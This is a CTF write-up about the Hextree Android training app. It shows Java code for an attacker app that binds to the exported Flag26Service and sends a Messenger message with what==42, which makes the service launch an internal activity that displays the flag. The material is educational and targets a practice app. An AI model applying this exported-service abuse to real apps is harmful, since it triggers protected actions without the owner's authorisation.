---
title: Exploiting Flag26Service – Android Messenger-Based Service (Hextree CTF)
description: Learn how to exploit a bound Messenger-based service in a CTF Android app to trigger an internal activity and capture the flag.
summary: Exploiting an Android Messenger-based service in a CTF app to capture a flag by triggering internal activity.
date: 2025-06-09
tags:
  - Android
  - IPC
  - Messenger
  - Android CTF
  - Hextree
  - Android Services
  - App Security
read_time: 3 minute read
---

# Exploiting Flag26Service – Android Messenger-Based Service (Hextree CTF)

## 🔍 Challenge Overview

We're given a bound `Service` called `Flag26Service`, which exposes a `Messenger` IPC interface using `onBind()`:

```java
@Override
public IBinder onBind(Intent intent) {
    return this.messenger.getBinder();
}
````

The service uses a `Handler` to process incoming messages. When it receives a message with `what == 42`, it triggers this function:

```java
private void success(String str) {
    Intent intent = new Intent(this, Flag26Activity.class);
    intent.putExtra("secret", secret);
    intent.putExtra("what", 42);
    intent.addFlags(268468224);
    intent.putExtra("hideIntent", true);
    startActivity(intent);
}
```

This launches the activity containing the flag, passing the secret and flag trigger values via the `Intent`.

---

## 🚧 The Catch

Even if you successfully bind to the service and send `Message.what == 42`, **`Flag26Activity` is not exported**:

```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag26Activity"
    android:exported="false"/>
```

This means the activity **cannot be launched** from your external app **unless the target app is already in the foreground or running in the background**.

---

## ✅ Solution Steps

### 1. Create a separate app

This is your attack app.

### 2. Bind to the service

Use `Context.BIND_AUTO_CREATE` to connect to the exported `Flag26Service`.

```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
bindService(intent, connection, Context.BIND_AUTO_CREATE);
```

### 3. Send the trigger message

Use a `Messenger` to send a message with `what == 42`.

```java
Message msg = Message.obtain(null, 42);
serviceMessenger.send(msg);
```

### 4. Bring the app to the foreground

Since `Flag26Activity` is not exported, the service **won’t launch it** unless the app is running in the foreground.

✅ **Workaround:**
After pressing the attack button, **manually open the target app** (`io.hextree.attacksurface`) to bring it to the foreground.
This will allow `startActivity(intent)` inside the service to succeed.

---

## 🏁 Flag Retrieval

Once the activity is launched, it checks if the passed `secret` matches the static `Flag26Service.secret`, and shows the flag if so:

```java
if (Flag26Service.secret.equals(stringExtra)) {
    success(this);
}
```

✅ **The flag is displayed inside `Flag26Activity` UI or logged using the internal `LogHelper` class.**

---

Thanks for reading 🙌